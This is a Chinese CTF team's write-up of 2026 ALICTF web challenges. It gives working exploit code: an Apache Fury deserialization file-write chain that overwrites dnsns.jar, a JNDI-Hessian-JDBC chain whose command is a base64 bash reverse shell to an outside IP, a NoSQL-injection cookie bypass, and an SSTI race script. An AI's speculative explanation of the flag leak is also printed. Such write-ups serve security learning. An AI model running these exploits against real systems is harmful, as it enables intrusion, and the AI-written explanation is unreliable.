---
title: 2026 ALICTF SU WriteUp
date: 2026-02-02T22:24:15+08:00
slug: "alictf-su-2026-wu"
tags: ["alictf"]
---

本次 ALICTF 我们 SU 取得了 第十名 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。

以下是我们 SU 本次 2026 ALICTF 的 WriteUp。

<!--more-->

![img](/img/2026-alictf/1.png)

# Web

## Fileury

自 RCTF 一役沉寂许久，中间更是在 0CTF 被打得找不着北，未曾想今朝阿里云 CTF 竟让我寻回了用武之地。

话不多说，直接看题，题目使用 Apache Fury 进行反序列化，配置如下：

```Java
Fury fury = Fury.builder()
    .withLanguage(Language.JAVA)
    .requireClassRegistration(false)  // 允许反序列化未注册类
    .build();
Object obj = fury.deserialize(Base64.getDecoder().decode(input));
```

Fury 通过 `fury/disallowed.txt` 维护一份类黑名单，在反序列化时会检查类名是否在黑名单中。

**黑名单检查逻辑** (`DisallowedList.java`):

```Java
static void checkNotInDisallowedList(String clsName) {
    if (DEFAULT_DISALLOWED_LIST_SET.contains(clsName)) {
        throw new InsecureException(String.format("%s hit disallowed list", clsName));
    }
}
```

黑名单包含了大部分常用反序列化 Gadget 类:

复盘去年 WP 发现，当前环境缺失了 `com.feilong` 依赖，导致二次反序列化绕过黑名单的方案失效，这也意味着挖掘新利用链

![img](/img/2026-alictf/2.png)

先分析一下黑名单，包含了大部分常用反序列化 Gadget 类:

| Gadget 类                       | 状态                                    |
| ------------------------------- | --------------------------------------- |
| `TemplatesImpl`                 | ❌ 被拦截                                |
| `InvokerTransformer`            | ❌ 被拦截                                |
| `ChainedTransformer`            | ❌ 被拦截                                |
| `ConstantTransformer`           | ❌ 被拦截                                |
| `TiedMapEntry`                  | ❌ 未在黑名单但依赖的 Transformer 被拦截 |
| `BadAttributeValueExpException` | ❌ 被拦截                                |

**未被拦截的关键类**:

- `org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap`
- `org.apache.commons.collections.map.LazyMap`
- `org.apache.commons.collections.keyvalue.TiedMapEntry`
- `org.apache.commons.collections.comparators.TransformingComparator`
- `org.apache.commons.collections.functors.ConstantFactory`
- `org.apache.commons.collections.functors.StringValueTransformer`

起初试图复刻去年的思路挖掘二次反序列化，但此路俺没走通，失败了

![img](/img/2026-alictf/3.png)

就在一筹莫展之际，猛地想起老大梅子酒在 Non-RCE 题解中提到的 `StoreableCachingMap` 链子。这条链子能实现任意路径写文件，幸运地避开了黑名单的拦截**！**

```Java
HashSet.readObject()
    HashMap.put()
        HashMap.hash()
            TiedMapEntry.hashCode()
                TiedMapEntry.getValue()
                    LazyMap.get()
                        SimpleCache$StorableCachingMap.put()
                            SimpleCache$StorableCachingMap.writeToPath()
                                FileOutputStream.write()
```

![img](/img/2026-alictf/4.png)

**适配Fury 完整****POC****如下：**

```Java
package reproduce;

import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.StringValueTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.fury.Fury;
import org.apache.fury.config.Language;

import java.io.FileOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

public class ExpAspectJ {

    public static void main(String[] args) throws Exception {
        // Goal: Arbitrary File Write
        // Chain:
        // PriorityQueue.readObject() -> heapify() -> comparator.compare()
        // comparator = TransformingComparator(StringValueTransformer)
        // transformer.transform(TiedMapEntry) -> TiedMapEntry.toString()
        // TiedMapEntry.toString() -> getValue() -> map.get(key)
        // map = LazyMap(StoreableCachingMap, ConstantFactory(bytes))
        // LazyMap.get(key) -> factory.create(key) -> bytes
        // LazyMap.put(key, bytes) -> StoreableCachingMap.put(key, bytes) -> write bytes to file 'key'
        byte[] content = Files.readAllBytes(Paths.get("dnsns.jar"));

        String filename = "../../../../../../../../../usr/local/openjdk-8/jre/lib/ext/dnsns.jar";
//        byte[] content = cronPayload.getBytes();

        // 1. Setup StoreableCachingMap (The Inner Map)
        // Ensure access to the class
        Class<?> scMapClass = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor<?> constructor = scMapClass.getDeclaredConstructor(String.class, int.class);
        constructor.setAccessible(true);
        // folder = ".", maxEntries = 100
        Map storeableMap = (Map) constructor.newInstance(".", 100);

        // 2. Setup LazyMap with ConstantFactory
        ConstantFactory factory = new ConstantFactory(content);
        Map lazyMap = LazyMap.decorate(storeableMap, factory);

        // 3. Setup TiedMapEntry
        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);

        // 4. Setup Comparator and Transformer
        // StringValueTransformer calls String.valueOf(obj) which calls obj.toString() (if not null)
        org.apache.commons.collections.Transformer transformer = StringValueTransformer.getInstance();
        TransformingComparator comparator = new TransformingComparator(transformer);

        // 5. Setup PriorityQueue
        PriorityQueue queue = new PriorityQueue(2, comparator);

        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(queue, 2);

        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queueArray = new Object[2];
        queueArray[0] = entry;
        queueArray[1] = entry;
        queueField.set(queue, queueArray);

        // 6. Serialize with Fury
        System.out.println("Serializing AspectJ Chain with Fury...");
        Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
        byte[] serializedInfo = fury.serialize(queue);

        String b64 = Base64.getEncoder().encodeToString(serializedInfo);
        FileOutputStream fos = new FileOutputStream("payload_aj.b64");
        fos.write(b64.getBytes());
        fos.close();
        System.out.println("AspectJ Payload saved to payload_aj.b64");
    }
}
```

**利用链触发流程**:

```Plain
PriorityQueue.readObject()
  → heapify()
  → siftDown()
  → comparator.compare(queue[0], queue[1])
  → TransformingComparator.compare()
  → StringValueTransformer.transform(TiedMapEntry)
  → String.valueOf(TiedMapEntry)
  → TiedMapEntry.toString()
  → TiedMapEntry.getValue()
  → LazyMap.get(key)
  → factory.create()                    [ConstantFactory 返回预设的 byte[]]
  → StoreableCachingMap.put(key, value)
  → 写入文件 key，内容为 value
```

有了写文件能力，我以为胜券在握。尝试了包括但不限于计划任务、LD_Preload、charsets.jar 等各种写入姿势，结果竟无一奏效。苦也！这波折腾直接把狂子写到怀疑人生，当时心凉半截，只道是这一血要拱手让人了

![img](/img/2026-alictf/5.png)

正所谓山重水复疑无路，柳暗花明又一村。绝境中忽忆起一篇 FastJson 写入绕过的文章，妙招在于开启 `-verbose:class` 参数，通过监控类加载情况，精准定位未被加载的 JAR 包实施覆盖利用。

通过监控类加载情况，`dnsns.jar` 没有被加载！

```Prolog
2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$AbortPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$CallerRunsPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$DiscardOldestPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$DiscardPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.JBossExecutors$3 from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.NullRunnable from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.JBossExecutors$5 from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded java.lang.IllegalAccessError from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.LoggingUncaughtExceptionHandler from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.wildfly.common.cpu.ProcessorInfo from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded sun.nio.cs.US_ASCII$Decoder from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.Version from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.Messages from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.Messages_$logger from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.StoppedExecutorException from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.EnhancedQueueExecutor$MBeanUnregisterAction from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.EnhancedQueueExecutor$MXBeanImpl from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.Waiter from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.atomic.Striped64 from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.atomic.LongAdder from /usr/local/openjdk-8/jre/lib/rt.jar]
```

这意味着可以通过反序列化

`sun.net.spi.nameservice.dns.DNSNameServiceDescriptor`触发`dnsns.jar`加载。这一记回马枪，直接让死局复活

```Java
package reproduce;

import org.apache.fury.Fury;
import org.apache.fury.config.Language;
import java.io.FileOutputStream;
import java.util.Base64;

public class ExpDNS {
    public static void main(String[] args) throws Exception {
        System.out.println("Generating payload to load sun.net.spi.nameservice.dns.DNSNameServiceDescriptor...");

        Fury fury = Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .build();

        // Load the class via reflection to avoid compilation errors if access is restricted
        Class<?> clazz = Class.forName("sun.net.spi.nameservice.dns.DNSNameServiceDescriptor");
        Object instance = clazz.newInstance();

        byte[] payload = fury.serialize(instance);
        String b64 = Base64.getEncoder().encodeToString(payload);

        try (FileOutputStream fos = new FileOutputStream("payload_dns.b64")) {
            fos.write(b64.getBytes());
        }

        System.out.println("Payload saved to payload_dns.b64");
        System.out.println("Payload Base64: " + b64);
    }
}
```

至于`dnsns.jar` 怎么改？驰骋AWDP赛场的诸君，像这种`JarEditor` 手改字节码的基操，想必无需我多言了，对吧？

![img](/img/2026-alictf/6.png)

先发包覆盖`dnsns.jar` ，再发包触发恶意类加载，完成RCE

![img](/img/2026-alictf/7.png)

比赛结束后，我试图向她解释什么是 Apache Fury 的黑名单绕过，解释那个 `dnsns.jar` 的覆盖是多么的神来之笔。她只是淡淡地看了我一眼转身就走了

那一刻我才明白

**可惜她不懂JAVA，也不懂我的⚡超！⚡级！⚡炎！🔥舞！🔥爆！⚡爆！⚡回！⚡**

![img](/img/2026-alictf/8.png)

参考资料：

1. [AliyunCTF2025 题解之 Jtools Fury 反序列化利用分析](https://mp.weixin.qq.com/s/dMl0aEg6p7w7MKlUe7pCdg?poc_token=HO5E0WejTX00WfrQI8oI22YsiTkxiEcLfLgbYyWv)
2. [AliyunCTF2025-JTools分析](https://eddiemurphy89.github.io/2025/03/01/AliyunCTF2025-JTools分析/#前言)
3. [Servlet中的时间竞争及AspectJWeaver反序列化Gadget构造[non-RCE 题解\]](https://meizjm3i.github.io/2021/03/07/Servlet中的时间竞争以及AsjpectJWeaver反序列化Gadget构造-AntCTFxD-3CTF-non-RCE题解/)
4. [[Java Puzzle #3 WP\] Fastjson write ascii JAR RCE](https://mp.weixin.qq.com/s/9e0V4bnV6fuGAfO1AKLYdw)
5. [可惜她不玩街霸，也没人懂我的⚡超！⚡级！⚡炎！🔥舞！🔥爆！⚡爆！⚡回！⚡](https://www.bilibili.com/video/BV1kdnszCEUy/?spm_id_from=333.337.search-card.all.click&vd_source=6870219ddced853e80ae239d5319e97c)

## MHGA

我曾经发誓这辈子不会再为Java流泪，但MHGA这JNDI+Hessian+JDBC组合洞的韧性让我哭花了妆😭😭😭

### **入口点**

题目提供了一个 Spring Boot 应用，核心在于 `Web.java` 提供了一个 HTTP 接口，该接口接受一个 `X-Lookup-URL` 头，并对其进行 JNDI `lookup`。

```Java
// Web.java
String url = exchange.getRequestHeaders().getFirst("X-Lookup-URL");
new InitialContext().lookup(url);
```

这是一个典型的 JNDI 注入入口，JDK版本为 OpenJDK 11.0.29 

### **Stage 1:**  **Hessian** **链构造**

题目名称暗示了 Hessian。检查依赖发现 `com.caucho.hessian.client.HessianProxyFactory` 实现了 `javax.naming.spi.ObjectFactory`。

可以通过 JNDI 返回一个 `Reference` 指向 `HessianProxyFactory`，所有的 `Reference` 属性都会被转化为 Hessian 代理的配置。

当 JNDI 进行 `getObjectInstance` 时，返回的是一个 Hessian 代理对象。如果后续对这个代理对象调用了方法，就会触发 Hessian 反序列化请求。

```Java
// HessianProxyFactory.java
public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
    Reference ref = (Reference)obj;
    String api = null;
    String url = null;

    for (int i = 0; i < ref.size(); i++) {
        RefAddr addr = ref.get(i);
        String type = addr.getType();
        String value = (String)addr.getContent();
        // 提取 Reference 中的配置
        if (type.equals("type")) {
            api = value; // 代理接口类型
        } else if (type.equals("url")) {
            url = value; // 目标 URL
        }
        // ... user, password ...
    }
    // 创建 Hessian 代理
    Class apiClass = Class.forName(api, false, this._loader);
    return this.create(apiClass, url);
}
```

**利用点**：

攻击者可以通过 JNDI 返回一个精心构造的 `Reference`：

1. **Factory Class**: `com.caucho.hessian.client.HessianProxyFactory` (本地存在)。
2. **type**: 设置为任意接口（例如 `javax.naming.directory.DirContext`）。
3. **url**: 设置为攻击者控制的 HTTP 地址。

当 `JndiLoginModule` 获取到这个对象后，它实际上是一个 Hessian 代理。一旦它调用该对象的任何方法（如 `DirContext.search`），Hessian 代理就会拦截调用，并通过 HTTP POST 请求将方法调用序列化发送给攻击者的 URL。

攻击者响应该 HTTP 请求时，返回一个恶意的 Hessian 序列化数据（RPC Reply），客户端在收到响应后会反序列化该数据，从而触发 Gadget Chain。

至于Hessian Payload，发现存在Jackson依赖就好办了，使用 `Jackson POJONode` 触发 `UnixPrintService`的getter 方法达成RCE 

2026 年了，不识 `UnixPrintService`，纵称英雄也枉然，快去学习我大哥yemoli在KCON2023首秀的《**Magic In Java** **API**》议题

![img](/img/2026-alictf/9.png)

**完整****POC****如下（** **Hessian** **序列化****数据必须是 2.0** **RPC** **Reply 格式）：**

```Java
package org.example;

import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.databricks.client.jdbc.internal.fasterxml.jackson.databind.node.POJONode;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicReference;

import static common.Reflections.newInstanceWithoutConstructor;
import static common.Reflections.setFieldValue;
import static common.Util.makeMap;
import static java.lang.reflect.AccessibleObject.setAccessible;

public class ExploitGenerator {

    // 目标文件路径
//    private static final String cmd = ";touch /tmp/pwnnnnn";
    private static final String cmd = "; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8yMjMuMTA5LjQ5LjUxLzk5OTkgMD4mMQ== | base64 -d | bash; echo";

    public static void main(String[] args) throws Exception {

        Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
        Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        Object unsafe = unsafeField.get(null);
        Method allocateInstance = unsafeClass.getMethod("allocateInstance", Class.class);

        // 3. 实例化 UnixPrintService (替换之前的 Proxy)
        // 这个类在 PrintServiceLookupProvider 中被广泛使用，是合法的 PrintService 实现
        Class<?> unixPrintServiceClass = Class.forName("sun.print.UnixPrintService");
        Object service = allocateInstance.invoke(unsafe, unixPrintServiceClass);

        setFieldValue(service, "printer", cmd);
        setFieldValue(service, "isInvalid", false);
        setFieldValue(service, "lpcStatusCom", new String[]{"", "", "", ""});

        POJONode pojoNode = new POJONode(service);

//
        // ---------------------------------------------------------
        // 5. Hessian2 序列化 (关键修复部分)
        // ---------------------------------------------------------
        byte[] payload = Hessian2_serialize(pojoNode);

        // 6. 输出 Base64
        String base64Payload = Base64.getEncoder().encodeToString(payload);
        System.out.println("----- Payload (Base64) -----");
        System.out.println(base64Payload);
        System.out.println("----------------------------");
    }

    public static byte[] Hessian2_serialize(Object o) throws IOException {
        SerializerFactory factory = new SerializerFactory();
        factory.setAllowNonSerializable(true);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(baos);
        baos.write('H');  // Hessian 2.0 call header
        baos.write(0x02); // major version
        baos.write(0x00); // minor version
        baos.write('R');  // Reply marker
        baos.write(67);
        hessian2Output.setSerializerFactory(factory);
        hessian2Output.writeObject(o);
        hessian2Output.flush();
        return baos.toByteArray();
    }

    public static void setAccessible(AccessibleObject member) {
        String versionStr = System.getProperty("java.version");
        int javaVersion = Integer.parseInt(versionStr.split("\\.")[0]);

        // not possible to quiet runtime warnings anymore...
        // see https://bugs.openjdk.java.net/browse/JDK-8210522
        // to understand impact on Permit (i.e. it does not work
        // anymore with Java >= 12)
        member.setAccessible(true);
    }

}
```

直接通过 JNDI 返回 Hessian 代理对象并不会立即触发 RCE，因为 `InitialContext.lookup` 仅仅返回对象，并不一定会调用其任意方法。

### **Stage 2:  ViburDBCPObjectFactory到 Databricks** **JDBC**

首先想到的是浅蓝师傅的《探索高版本 JDK 下 JNDI 漏洞的利用方法》提到的`LookupRef` 可以触发二次JNDI请求，后续会调用getClass()方法，触发hessian反序列化，但是其只存在在Tomcat 依赖中

难道这就陷入到僵局了嘛，Bro😭😭😭

```Java
LookupRef ref = new LookupRef("java.lang.String","look");
ref.add(new StringRefAddr("factory", "com.caucho.hessian.client.HessianProxyFactory"));
//com.caucho.burlap.client.BurlapProxyFactory
ref.add(new StringRefAddr("type", "java.lang.AutoCloseable"));
ref.add(new StringRefAddr("url", "http://127.0.0.1:6666/"));
@Override
public Object getObjectInstance(Object obj, Name name, Context nameCtx,
        Hashtable<?, ?> environment) throws Exception {

    String lookupName = null;
    Object result = null;

    if (obj instanceof LookupRef) {
        Reference ref = (Reference) obj;
        ObjectFactory factory = null;
        RefAddr lookupNameRefAddr = ref.get(LookupRef.LOOKUP_NAME);
        if (lookupNameRefAddr != null) {
            lookupName = lookupNameRefAddr.getContent().toString();
        }

        try {
            if (lookupName != null) {
                if (!names.get().add(lookupName)) {
                    String msg = sm.getString("lookupFactory.circularReference", lookupName);
                    NamingException ne = new NamingException(msg);
                    log.warn(msg, ne);
                    throw ne;
                }
            }
            RefAddr factoryRefAddr = ref.get(Constants.FACTORY);
            if (factoryRefAddr != null) {
                // Using the specified factory
                String factoryClassName = factoryRefAddr.getContent().toString();
                // Loading factory
                ClassLoader tcl = Thread.currentThread().getContextClassLoader();
                Class<?> factoryClass = null;
                if (tcl != null) {
                    try {
                        factoryClass = tcl.loadClass(factoryClassName);
                    } catch (ClassNotFoundException e) {
                        NamingException ex = new NamingException(
                                sm.getString("lookupFactory.loadFailed"));
                        ex.initCause(e);
                        throw ex;
                    }
                } else {
                    try {
                        factoryClass = Class.forName(factoryClassName);
                    } catch (ClassNotFoundException e) {
                        NamingException ex = new NamingException(
                                sm.getString("lookupFactory.loadFailed"));
                        ex.initCause(e);
                        throw ex;
                    }
                }
                if (factoryClass != null) {
                    try {
                        factory = (ObjectFactory) factoryClass.getConstructor().newInstance();
                    } catch (Throwable t) {
                        if (t instanceof NamingException)
                            throw (NamingException) t;
                        NamingException ex = new NamingException(
                                sm.getString("lookupFactory.createFailed"));
                        ex.initCause(t);
                        throw ex;
                    }
                }
            }
            // Note: No defaults here
            if (factory != null) {
                result = factory.getObjectInstance(obj, name, nameCtx, environment);
            } else {
                if (lookupName == null) {
                    throw new NamingException(sm.getString("lookupFactory.createFailed"));
                } else {
                    result = new InitialContext().lookup(lookupName);
                }
            }

            Class<?> clazz = Class.forName(ref.getClassName());
            if (result != null && !clazz.isAssignableFrom(result.getClass())) {
                String msg = sm.getString("lookupFactory.typeMismatch",
                        name, ref.getClassName(), lookupName, result.getClass().getName());
                NamingException ne = new NamingException(msg);
                log.warn(msg, ne);
                // Close the resource we no longer need if we know how to do so
                if (isInstance(result.getClass(), "java.lang.AutoCloseable")) {
                    try {
                        Method m = result.getClass().getMethod("close");
                        m.invoke(result);
                    } catch (Exception e) {
                        // Ignore
                    }
                }
                throw ne;
            }
        } finally {
            names.get().remove(lookupName);
        }
    }


    return result;
}
```

![img](/img/2026-alictf/10.png)

继续分析发现还存在ViburDBCPObjectFactory 可以利用，其中，允许通过 JNDI Reference 实例化并配置一个 DataSource，且会自动调用其 `start()`方法内部调用 `DriverManager.getDriver(jdbcUrl)`，从而触发JDBC 攻击

值得庆幸的是有 Databricks JDBC 驱动且存在CVE-2024-49194 会触发JNDI注入，

搭建 HTTP 服务器，提供 `jaas.conf`：

```Plain
Client {
   com.sun.security.auth.module.JndiLoginModule required
   user.provider.url="ldap://attacker:1389/Hessian/Exploit"
   group.provider.url="test"
   tryFirstPass="true";
};
```

当 JDBC 驱动加载此配置并进行身份验证时，`JndiLoginModule` 会读取 `user.provider.url` 并执行 `ctx.lookup()`，那么整条攻击链条就瞬间闭环了

**攻击链路：**

1. **Attacker**: 发送 `X-Lookup-URL: ldap://attacker/Vibur/Exploit`
2. **Server**: JNDI lookup -> `ViburDBCPObjectFactory`
3. **Vibur**: 创建 DataSource -> 连接 JDBC URL
4. **JDBC**: 下载 `http://attacker/jaas.conf` -> 加载 `JndiLoginModule`
5. **JAAS**: JndiLoginModule lookup `ldap://attacker/Hessian/Exploit`
6. **Hessian**: 返回 `HessianProxy` (代理 `DirContext`)
7. **JAAS**: 调用 `proxy.search()` -> 触发 Hessian 请求
8. **Server**: 反序列化 Hessian Payload -> `UnixPrintService` -> RCE
9. **RCE**: `chmod 444 /flag && cat /flag` -> CAT FLAG

![img](/img/2026-alictf/11.png)

### Stage 3:  获取FLAG

改写x1r0z 师傅的`JNDIMap` 项目修改参考 https://github.com/N1etzsche0/JNDIMap

![img](/img/2026-alictf/12.png)

爽！😎这才叫RCE🎶！😋👍爽！😎这才叫RCE🎶！😋👍😎这才叫RCE🎶！

![img](/img/2026-alictf/13.png)

GGWP

青山不改，绿水长流。山水有相逢，下篇WP再见

![img](/img/2026-alictf/14.png)

参考资料：

1. [Magic In Java Api](https://github.com/knownsec/KCon/blob/master/2023/Magic In Java Api.pdf)
2. [探索高版本 JDK 下 JNDI 漏洞的利用方法](https://tttang.com/archive/1405/)
3. [CVE-2024-49194 Databricks JDBC 驱动 JNDI 注入漏洞分析](https://mp.weixin.qq.com/s/UdKf8PhTlXuWwfBDQXDGuA)
4. [JNDIMap](https://github.com/X1r0z/JNDIMap)
5. [NIKO15次梦碎Major](https://www.bilibili.com/video/BV1AZmEBVEsU/?share_source=copy_web&vd_source=8c76f8e232993e8e3083ed467fe773f7)、[😭一生只哭18次😭](https://www.bilibili.com/video/BV1GEm9BoEnq/?spm_id_from=333.337.search-card.all.click&vd_source=6870219ddced853e80ae239d5319e97c)、[【活着】“所以生命啊，它苦涩如歌”](https://www.bilibili.com/video/BV15Y4y117sn/?share_source=copy_web&vd_source=8c76f8e232993e8e3083ed467fe773f7)

## easy_login

通过审计 src/server.ts，可以发现

  admin 用户会随机生成一个长字符串密码

![img](/img/2026-alictf/15.png)

  Flag 在 /admin 接口中返回，该接口要求当前登录用户必须是 admin

![img](/img/2026-alictf/16.png)

 使用 cookie-parser 解析 Cookie，并将解析出的 sid 直接给数据库查询

![img](/img/2026-alictf/17.png)

  在 sessionMiddleware 中以下代码存在nosql注入

![img](/img/2026-alictf/18.png)

 当 Cookie 以 j: 开头时，cookie-parser 会尝试将其解析为 JSON 对象。如果我们将 sid 设置为 {"$ne": "random_value"}，查询语句将变为 db.sessions.findOne({ sid: { "$ne": "random_value" } })

所以我们可以通过 /visit 接口，利用应用内部的 Bot 自动进行管理员登录。这将导致数据库中产生一个admin 用户的 Session，再使用 NoSQL 注入绕过 sid 的精确匹配。设置Cookie 为sid=j:{"$ne": "anything"} 访问 /admin，就可以绕过鉴权

exp

```Python
import requests

target = "http://223.6.249.127:12106"

# 第一步：唤醒 Bot 登录，产生 Admin Session
print("[*] Waking up the bot...")
requests.post(f"{target}/visit", json={"url": "http://example.com"})

# 第二步：使用 NoSQL 注入 Cookie 劫持 Admin 权限
print("[*] Exploiting NoSQL Injection...")
cookies = {
    # 'j:' 前缀触发 cookie-parser 的 JSON 解析逻辑
    "sid": 'j:{"$ne": "null"}'
}

res = requests.get(f"{target}/admin", cookies=cookies)
print("[+] Server Response:")
print(res.text)
```

flag

```
alictf{0c6b7a19-8a74-4129-8dc8-913e98cad823}
```

## Cutter

审计代码可以发现admin路由下存在可以利用的一些点

![img](/img/2026-alictf/19.png)

 path.join`拼接`tmpl`参数时没有过滤`..`，导致路径穿越和任意文件读取

读取的文件内容直接通过 `render_template_string` 渲染。如果我们能控制被读取的文件内容，就能实现 SSTI

但是这里存在一个问题就是需要API_KEY才能实现

还有action路由下存在格式化字符串漏洞可以利用

![img](/img/2026-alictf/20.png)

在 `debug` 模式下，允许通过 `content.format(app)` 泄露对象属性。这可以用来泄露全局变量中的 `API_KEY`

heartbeat路由

![img](/img/2026-alictf/21.png)

可以发现我们可以通过请求参数控制任意的 `headers，`可以注入 `Content-Type` 来改变 `httpx` 发往由 `/action` 接收的数据包的结构

`/heartbeat` 硬编码了 `action` 类型为 `echo`，无法直接触发 `/action` 的 `debug` 模式。但通过注入 `Content-Type` 头部，我们可以劫持数据包，设置 `client=Content-Type`和`token=multipart/form-data; boundary=HACKER`，在 `text` 字段中构造包含 `{"type": "debug"}` 的 `action` 部分

这样当 `/action` 收到请求时，它会优先使用我们注入的 `HACKER` 作为 Boundary。后端会读取我们在 `text` 中构造的第二个 `action` 字段，从而覆盖掉原始的 `echo` 

泄漏 Payload:`{0.view_functions[index].globals[API_KEY]}`

可以得到`API_KEY = 911ec63d10f2bd607080ca3ff396a647699de5159e13f99c615e03fd9aa2a806`

拿到了 `API_KEY` 后，我们可以访问 `/admin`。虽然可以 LFI 读文件，但是我们不知道flag的具体文件名。

![img](/img/2026-alictf/22.png)

在 Linux 中，`/proc/self/fd/` 包含了进程当前打开的所有文件描述符。FD 3通常是服务器监听的 Socket。FD 4-10: 通常是当前正在处理请求的输入流（`wsgi.input`）或者因请求体过大而产生的临时缓存文件。

所以如果我们包含正在读取我们请求体的那个 FD，`/admin` 就会读取我们发送的内容。

让ai写了个FD条件竞争的脚本

```Python
import requests
import threading
import time
import socket

TARGET_IP = "223.6.249.127"
TARGET_PORT = "34696"
BASE_URL = f"http://{TARGET_IP}:{TARGET_PORT}"
API_KEY = "911ec63d10f2bd607080ca3ff396a647699de5159e13f99c615e03fd9aa2a806"

def trigger_upload():
    print("[*] Starting large upload to /heartbeat...")
    # Payload: list root directory
    ssti = "{{ config.class.init.globals['os'].listdir('/') }}"
    padding = "A" * (600000) # 600KB padding to ensure it goes to disk
    payload = ssti + padding

    try:
        # We use a long timeout to keep the connection open as long as possible
        r = requests.post(f"{BASE_URL}/heartbeat", data={"text": payload}, timeout=30)
        print(f"[] Upload finished with status {r.status_code}")
    except Exception as e:
        print(f"[] Upload error (expected if we block): {e}")

def brute_fd_ssti():
    time.sleep(2) # Wait for upload to start and potentially hit /action
    print("[*] Starting FD brute force on /admin...")
    headers = {"Authorization": API_KEY}

    for fd in range(4, 25):
        try:
            # We hit /admin which will read the FD
            # If the FD is the temp file, it will render our SSTI
            params = {"tmpl": f"../../../../proc/self/fd/{fd}"}
            r = requests.get(f"{BASE_URL}/admin", headers=headers, params=params, timeout=2)
            if r.status_code == 200 and "['" in r.text and "flag" in r.text:
                print(f"\n[!!!] SUCCESS! Found listing on FD {fd}:")
                print(r.text)
                return True
            elif r.status_code == 200:
                print(f"FD {fd} returned 200 but no flag listing. Snippet: {r.text[:50]}")
        except:
            pass
    return False

Run upload in background
t = threading.Thread(target=trigger_upload)
t.start()

Brute force FDs
brute_fd_ssti()
```

1. 由一个线程向 `/heartbeat` 发送超大请求（几百 KB 的填充数据），目的是让 Werkzeug 将请求体写入磁盘上的临时文件。
2. 主线程同时在 `/admin` 上循环尝试读取各显 FD（如 `/proc/self/fd/6`）。

运行脚本的目标不是直接读 Flag 文件，而是希望 FD 里面是我们发送的 SSTI Payload `{{ config...os.listdir('/') }}`，从而让我们执行命令去寻找 Flag。

结果在进行到Step 1147的时候收到了如下响应： `FD 6 returned 200 but no flag listing. Snippet: alictf{301e7a69...}`

ai分析原因：

1. 残存数据 (Residual Buffers): 服务器是多线程的。在之前的格式化字符串攻击中，我们可能已经通过 format(app) 引起了某些包含了 flag 或者系统环境信息的变量被输出到了某个内部缓冲区。
2. 异步连接泄露: 当我们通过 /admin 包含正在处理的 Socket FD 时，我们读取的是该 FD 对应的 内核级缓冲区 (Kernel Buffer)。如果这个时候服务器刚刚处理完一个含有泄露信息的请求，或者正在处理带有敏感数据的其他内部请求，通过 LFI 读取 FD 会直接捕获到这些“尚未清除”的原始数据。
3. 内存映射: 在某些 Python 版本中，render_template_string 的处理逻辑结合 Werkzeug 对 wsgi.input 的处理，在极端高并发的情况下，FD 可能会指向一个被重置前留有前一个请求内容的内存页。

简单来说：我们像是在服务器的数据交换管道里插了一根吸管（通过读取 FD），本来想吸出自己的 Payload，结果顺带吸出了前序攻击或系统处理中残存在管道里的 Flag。

exp

```Python
import requests
import threading
import time
import re

# --- Configuration ---
TARGET_URL = "http://223.6.249.127:34696"

def leak_api_key():
